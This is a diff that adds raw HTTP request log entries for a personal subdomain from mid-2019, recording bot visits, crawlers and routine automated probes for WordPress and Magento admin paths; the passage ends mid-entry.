@@ -49,3 +49,2767 @@ GET
 {}
 {}
 **END SECURE REQUEST
+========= REQ #3==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:26:08:43:15
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "3NJ43VELPUNFDV 166570510847982483 955477058927105578 960730209727193081 675943637657783442 209601551082185537 399014744552704330 838321975939985206 933695202846852247 835040156034331719 425739367370927170 206443241148496372 787901715419552863 707333738848004403 936948361757390249 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #4==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:26:08:43:16
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "QC4GH 338214319624037555 979922779670111051 18207301891387594 945920097003230017 980633662860784258 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #5==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:27:02:09:38
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "*/*",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+}
+::ffff:18.130.43.200
+{}
+{}
+**END SECURE REQUEST
+========= REQ #6==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:27:02:44:58
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "*/*",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+}
+::ffff:18.130.43.200
+{}
+{}
+**END SECURE REQUEST
+========= REQ #7==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:28:12:06:50
+GET
+{
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "accept-language": "en-US,en;q=0.5",
+  "host": "github.davidthats.me"
+}
+::ffff:51.15.191.81
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #8==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:28:12:06:56
+GET
+{
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "accept-language": "en-US,en;q=0.5",
+  "host": "github.davidthats.me"
+}
+::ffff:62.4.14.198
+{}
+{}
+**END SECURE REQUEST
+========= REQ #9==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:30:20:35:59
+HEAD
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:159.65.171.34
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #10==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:30:20:47:59
+GET
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:159.65.171.34
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #11==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:30:20:57:24
+GET
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:159.65.171.34
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #12==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.htm
+2019:05:30:21:06:16
+GET
+{
+  "host": "github.davidthats.me",
+  "referer": "https://www.netcraft.com/survey/",
+  "user-agent": "Mozilla/4.0 (compatible; Netcraft Web Server Survey)",
+  "connection": "close"
+}
+::ffff:159.65.171.34
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #13==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:08:33:49
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)",
+  "x-matrix-proxy": "direct",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate"
+}
+::ffff:65.154.226.109
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #14==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:08:33:49
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)",
+  "x-matrix-proxy": "direct",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate"
+}
+::ffff:65.154.226.109
+{}
+{}
+**END SECURE REQUEST
+========= REQ #15==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:08:37:32
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "Keep-Alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate",
+  "accept-language": "en-US"
+}
+::ffff:65.154.226.126
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #16==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:08:37:33
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "Keep-Alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate",
+  "accept-language": "en-US"
+}
+::ffff:65.154.226.126
+{}
+{}
+**END SECURE REQUEST
+========= REQ #17==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:08:37:38
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.157 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+  "accept-encoding": "gzip, deflate"
+}
+::ffff:65.154.226.126
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #18==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:08:37:38
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/74.0.3729.157 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+  "accept-encoding": "gzip, deflate, br"
+}
+::ffff:65.154.226.126
+{}
+{}
+**END SECURE REQUEST
+========= REQ #19==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:08:40:08
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "Keep-Alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate",
+  "accept-language": "en-US"
+}
+::ffff:65.154.226.126
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #20==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:08:40:08
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "Keep-Alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+  "accept-encoding": "gzip, deflate",
+  "accept-language": "en-US"
+}
+::ffff:65.154.226.126
+{}
+{}
+**END SECURE REQUEST
+========= REQ #21==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:14:11:23
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "5342BBXQ 460056662906568740 107762292631432394 790389424322816141 93493130326139528 660673658689676013 861397826297004017 183684660302692272 606921741933288213 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #22==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:05:31:14:11:24
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "TWNY74GP8RM52J 192631637009155063 102855142034001893 195049133666109725 372962250628888424 169675908896675678 426240183950784989 972070258762643966 589929643022543081 733554266443450653 260713605561821310 166860680538929547 57818817704773114 763486449446646352 491646744013708818 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #23==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:03:00:03:33
+GET
+{
+  "host": "github.davidthats.me",
+  "accept-charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)",
+  "accept-encoding": "identity",
+  "accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+  "accept-language": "en-gb,en;q=0.5",
+  "connection": "close"
+}
+::ffff:134.209.174.93
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #24==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:03:00:03:38
+GET
+{
+  "host": "github.davidthats.me",
+  "accept-charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)",
+  "accept-encoding": "identity",
+  "accept": "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
+  "accept-language": "en-gb,en;q=0.5",
+  "connection": "close"
+}
+::ffff:134.209.174.93
+{}
+{}
+**END SECURE REQUEST
+========= REQ #25==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:04:14:41:36
+GET
+{
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*",
+  "accept-encoding": "gzip, deflate",
+  "accept-language": "en-US,en;q=0.9",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
+  "host": "github.davidthats.me",
+  "connection": "close"
+}
+::ffff:52.53.227.149
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #26==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:04:14:41:39
+GET
+{
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*",
+  "accept-encoding": "gzip, deflate",
+  "accept-language": "en-US,en;q=0.9",
+  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36",
+  "host": "github.davidthats.me",
+  "connection": "close"
+}
+::ffff:52.53.227.149
+{}
+{}
+**END SECURE REQUEST
+========= REQ #27==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:06:06:21:05
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "W0MQ5RF4IDQQIS 125194059760280706 400912969792756538 434121825136138648 808378616836941127 708740851850525819 206036727179253338 572819319033826008 465346651133003789 482041448780552235 754423229206265821 243549026362262605 545981955221801824 808732644721154289 618167822281761843 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #28==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:06:06:21:06
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "RPTDDTR6 932891703495819845 301034754161500696 980177264784047406 268872576110620776 664572895975032888 628152117125798907 148986235444413306 970796090729513333 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #29==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:06:11:07:15
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)"
+}
+::ffff:104.248.12.89
+{}
+{}
+**END SECURE REQUEST
+========= REQ #30==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:08:05:15:20
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "upgrade-insecure-requests": "1",
+  "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+  "referer": "https://www.linkedin.com/in/david-solodukhin/detail/treasury/summary/?entityUrn=urn%3Ali%3Afs_treasuryMedia%3A(ACoAABjEhuUBo5y6HtNwbygdR_4Io4bmB8jAE4c%2C1558017519684)&section=summary&treasuryCount=1",
+  "accept-encoding": "gzip, deflate, br",
+  "accept-language": "en-US,en;q=0.9"
+}
+::ffff:99.105.210.122
+{}
+{}
+**END SECURE REQUEST
+========= REQ #31==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:12:02:11:16
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "YE4 521145822674437616 424438825945966890 847556990077772559 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #32==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:12:02:11:18
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "K 110441909020526365 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #33==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:18:06:21:57
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "X7STS8KY8 494990687781386532 84638016292055973 669287429033173955 858844573038443594 315808256113535083 100587301333171886 363598645406192075 558822344499084016 402940623910766550 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #34==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:18:06:21:58
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "I8LBL8RDWZAM66CMQ7UU 34990505695059691 491798420714539637 923087196374329995 897841303239027232 393284708507008476 125638661922666493 146963050047056956 902342237426420988 301369264582507563 45445369169213913 161192190224052103 510050947357792018 203905275071715024 615485389235472618 265126226555138377 38843326712687851 399126046694852849 421061390595643586 963319091548859723 312003379308667614 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #35==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:06:20:01:55:15
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:51.255.98.249
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #36==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:06:20:01:55:16
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "referer": "http://github.davidthats.me/wp-login.php",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:51.255.98.249
+{}
+{}
+**END SECURE REQUEST
+========= REQ #37==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:06:24:09:36:12
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:51.255.219.56
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #38==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:06:24:09:36:13
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "referer": "http://github.davidthats.me/wp-login.php",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:51.255.219.56
+{}
+{}
+**END SECURE REQUEST
+========= REQ #39==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:24:18:44:05
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "7SQYVMO4DCNOUJG 291548097970748804 268102457831695769 932178069051012129 547218988215396869 651692937881904330 258888164018328572 175619452003489336 552708070903705240 54163099856995986 817416382188981904 93083257658755310 236896414818054817 923068030259845090 562391097812383319 731746446739127892 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #40==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/
+2019:06:24:18:44:06
+GET
+{
+  "host": "github.davidthats.me",
+  "connection": "keep-alive",
+  "accept-encoding": "gzip, deflate",
+  "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+  "user-agent": "UECELTI2 252619355530585414 972670376003282635 2347858784827945 252564657115685951 657049458602540035 475058772135973449 603854095879425120 512841080841985231 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
+  "accept-language": "en-US,en;q=0.5"
+}
+::ffff:104.131.19.168
+{}
+{}
+**END SECURE REQUEST
+========= REQ #41==========
+::INSECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:06:27:06:55:14
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:37.187.196.64
+undefined
+undefined
+::END INSECURE REQUEST
+========= REQ #42==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/wp-login.php
+2019:06:27:06:55:14
+GET
+{
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
+  "referer": "http://github.davidthats.me/wp-login.php",
+  "accept-encoding": "gzip",
+  "connection": "close"
+}
+::ffff:37.187.196.64
+{}
+{}
+**END SECURE REQUEST
+========= REQ #43==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/index.php/admin/
+2019:06:29:16:29:09
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #44==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/shop/index.php/admin/
+2019:06:29:16:29:11
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #45==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/store/index.php/admin/
+2019:06:29:16:29:13
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #46==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/magento/index.php/admin/
+2019:06:29:16:29:15
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #47==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/downloader/index.php
+2019:06:29:16:29:18
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #48==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/shop/downloader/index.php
+2019:06:29:16:29:21
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #49==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/store/downloader/index.php
+2019:06:29:16:29:23
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #50==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/magento/downloader/index.php
+2019:06:29:16:29:24
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #51==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/errors/503.php
+2019:06:29:16:29:28
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #52==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/shop/errors/503.php
+2019:06:29:16:29:30
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #53==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/store/errors/503.php
+2019:06:29:16:29:32
+GET
+{
+  "te": "deflate,gzip;q=0.3",
+  "keep-alive": "300",
+  "connection": "Keep-Alive, TE",
+  "host": "github.davidthats.me",
+  "user-agent": "Mozilla/5.0 (Windows; U; Windows NT 2.0) Gecko/20091201 Firefox/3.5.6 GTB5"
+}
+::ffff:82.102.27.75
+{}
+{}
+**END SECURE REQUEST
+========= REQ #54==========
+**SECURE REQUEST:
+URL: http(s)://github.davidthats.me/magento/errors/503.php
+2019:06:29:16:29:34
+GET
+{
